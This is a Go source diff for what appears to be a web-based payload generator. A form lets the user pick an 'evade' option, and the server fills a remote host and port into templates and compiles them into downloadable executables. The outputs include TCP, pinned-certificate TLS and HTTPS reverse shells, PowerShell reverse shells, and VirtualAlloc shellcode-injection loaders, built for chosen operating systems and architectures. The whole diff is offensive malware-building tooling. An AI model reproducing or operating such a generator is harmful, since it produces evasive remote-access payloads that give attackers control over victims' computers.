@@ -30,7 +30,7 @@ type DownloadLink struct {
 var appconfig baseframe
 var dwnloadlink DownloadLink
 var knockertemplate *template.Template
-var basepath, outpath, exepath, exeoutpath string
+var basepath, outpath, exepath, exeoutpath, downloadlink string
 
 func init() {
 	appconfig = baseframe{}
@@ -58,6 +58,39 @@ func fillappconfig() {
 	}
 
 }
+
+func buildrevshellexe(exepath, gofilepath, ostype, arch string) {
+	if runtime.GOOS == "linux" {
+		cmdpath, _ := exec.LookPath("bash")
+		var execargs string
+		execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath
+
+		//fmt.Println(execargs)
+		cmd := exec.Command(cmdpath, "-c", execargs)
+		err := cmd.Start()
+		cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			//fmt.Println(gofilepath)
+			fmt.Println("Build Success !")
+		}
+	} else {
+		//fmt.Println("About to build " + gofilepath)
+		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
+		err := cmd.Start()
+		cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			//fmt.Println(gofilepath)
+			fmt.Println("Build Success !")
+		}
+	}
+}
+
 func buildexe(exepath string, gofilepath string) {
 	if runtime.GOOS == "linux" {
 		cmdpath, _ := exec.LookPath("bash")
@@ -279,7 +312,7 @@ func createpsvirtualallocpayload(rhost, rport, shellcode, saveas string) {
 }
 
 // creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
-func creategopayload(ipandport string, basefilepath string, outfilepath string, downloadlink string, sourcefilelink string) {
+func creategopayload(ipandport, basefilepath, outfilepath, downloadlink, sourcefilelink, ostype, archtype, fprint string) {
 	file, err := os.Open(basefilepath)
 	if err != nil {
 		log.Fatal(err)
@@ -298,13 +331,22 @@ func creategopayload(ipandport string, basefilepath string, outfilepath string, 
 		if strings.Contains(str, "REVIPPORT") {
 			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
 		}
+		if strings.Contains(str, "FPRINT") {
+			str = strings.Replace(str, "FPRINT", fprint, 1)
+		}
 		newFile.WriteString(str + "\n")
 	}
 
 	if err := scanner.Err(); err != nil {
 		log.Fatal(err)
 	}
-	buildexe(downloadlink, sourcefilelink)
+	if ostype != "" && archtype != "" {
+		//fmt.Println("bulding " + downloadlink)
+		//fmt.Println("buiulding " + sourcefilelink)
+		buildrevshellexe(downloadlink, sourcefilelink, ostype, archtype)
+	} else {
+		buildexe(downloadlink, sourcefilelink)
+	}
 }
 
 func creategorevhttppayload(ipandport string) {
@@ -335,7 +377,7 @@ func creategorevhttppayload(ipandport string) {
 	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
 }
 func createpsrevshellpayload(rhost, rport, saveas string) {
-	file, err := os.Open("basefiles/rev.ps1")
+	file, err := os.Open("basefiles/psrevcmd.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -376,10 +418,14 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 	} else {
 		err := req.ParseForm()
 		saveas := req.Form.Get("saveas")
+		if strings.TrimSpace(saveas) == "" {
+			saveas = "noname"
+		}
 		if err != nil {
 			fmt.Println(err)
 		}
-		evadeoption := req.Form.Get("evadeoptions")
+
+		evadeoption := req.Form.Get("evdoptions")
 		fmt.Println(evadeoption)
 		rhost := req.Form.Get("rhost")
 		//fmt.Println("rhost = " + rhost)
@@ -387,23 +433,20 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 
 		//fmt.Println("rport =" + rport)
 		//finflag := make(chan string)
-		if evadeoption == "psRevShell" {
+		if evadeoption == "ReverseShell (PowerShell)" {
+
 			createpsrevshellpayload(rhost, rport, saveas)
-			//<-finflag
-			//time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/rev.go")
 			//fmt.Println(dwnloadlink.Link)
-		} else if evadeoption == "psValloc" {
+		} else if evadeoption == "Virtual Alloc Injection (PowerShell)" {
 			shellcode := req.Form.Get("shellcode")
 			createpsvirtualallocpayload(rhost, rport, shellcode, saveas)
-			//time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/psvalloc.go")
 			//fmt.Println("shellcode =" + shellcode)
 
-		} else if evadeoption == "psVallocencode" {
-
+		} else if evadeoption == "VAlloc Injection (Cmprssd/EnC RevHttp) (PowerShell)" {
 			strtocompress := readandreplacefilecontent(rhost + ":" + rport)
 			//fmt.Println(strtocompress)
 			compressed := shellexeccompress(strtocompress)
@@ -415,30 +458,72 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			//os.Remove("outfiles/psencodevalloc.go")
 			//fmt.Println(dwnloadlink.Link)
 
-		} else if evadeoption == "gorevhttpvalloc" {
+		} else if evadeoption == "ReverseHTTP (VAlloc) (Go Lang)" {
 			//creategorevhttppayload(rhost + ":" + rport)
 			basepath = filepath.FromSlash("basefiles/gorevhttp.go")
 			outpath = filepath.FromSlash("outfiles/gorevhttp.go")
 			exepath = filepath.FromSlash("download/" + saveas + ".exe")
 			exeoutpath = filepath.FromSlash("outfiles/gorevhttp.go")
-			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
+			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
 			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/gorevhttp.go")
-		} else if evadeoption == "goRevShel" {
-			basepath = filepath.FromSlash("basefiles/gorevcmd.go")
-			outpath = filepath.FromSlash("outfiles/gorevcmd.go")
-			exepath = filepath.FromSlash("download/" + saveas + ".exe")
-			exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
-			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
+		} else if evadeoption == "ReverseShell (Go Lang)" {
+			var archtype string
+			shelltype := req.Form.Get("shelltype")
+			ostype := strings.ToLower(req.Form.Get("ostype"))
+			if req.Form.Get("archtype") == "32" {
+				archtype = "386"
+			} else {
+				archtype = "amd64"
+			}
+
+			fprint := req.Form.Get("fingerprint")
+
+			if ostype == "windows" {
+				exepath = filepath.FromSlash("download/" + saveas + ".exe")
+				downloadlink = "download/" + saveas + ".exe"
+			} else {
+				exepath = filepath.FromSlash("download/" + saveas)
+				downloadlink = "download/" + saveas
+			}
+
+			if shelltype == "TCP" {
+				basepath = filepath.FromSlash("basefiles/gorevcmd.go")
+				outpath = filepath.FromSlash("outfiles/gorevcmd.go")
+				exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
+			} else if shelltype == "TCP/TLS(PinnedCert)" {
+				basepath = filepath.FromSlash("basefiles/mask.go")
+				outpath = filepath.FromSlash("outfiles/mask.go")
+				exeoutpath = filepath.FromSlash("outfiles/mask.go")
+			} else if shelltype == "HTTPS" {
+				basepath = filepath.FromSlash("basefiles/shadow.go")
+				outpath = filepath.FromSlash("outfiles/shadow.go")
+				exeoutpath = filepath.FromSlash("outfiles/shadow.go")
+			}
+			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, ostype, archtype, fprint)
 			//time.Sleep(5000 * time.Millisecond)
-			dwnloadlink.Link = "download/" + saveas + ".exe"
-			os.Remove("outfiles/gorevcmd.go")
-		} else if evadeoption == "gorevhttpsheap" {
+			dwnloadlink.Link = downloadlink
+			gofiles, err := filepath.Glob("outfiles/*.go")
+			if err != nil {
+				fmt.Println(err)
+			}
+			for _, f := range gofiles {
+				if err := os.Remove(f); err != nil {
+					fmt.Println(err)
+				}
+			}
+			//os.Remove("outfiles/gorevcmd.go")
+		} else if evadeoption == "ReverseHTTPs (HeapAlloc) (Go Lang)" {
+			fmt.Println("rhost =" + rhost)
+			fmt.Println("rport =" + rport)
+			fmt.Println("save as =" + saveas)
+			os.Exit(0)
+
 			basepath = filepath.FromSlash("basefiles/gorevhttps.go")
 			outpath = filepath.FromSlash("outfiles/gorevhttps.go")
 			exepath = filepath.FromSlash("download/" + saveas + ".exe")
 			exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
-			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
+			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath, "", "", "")
 			dwnloadlink.Link = "download/" + saveas + ".exe"
 			os.Remove("outfiles/gorevhttps.go")
 		}
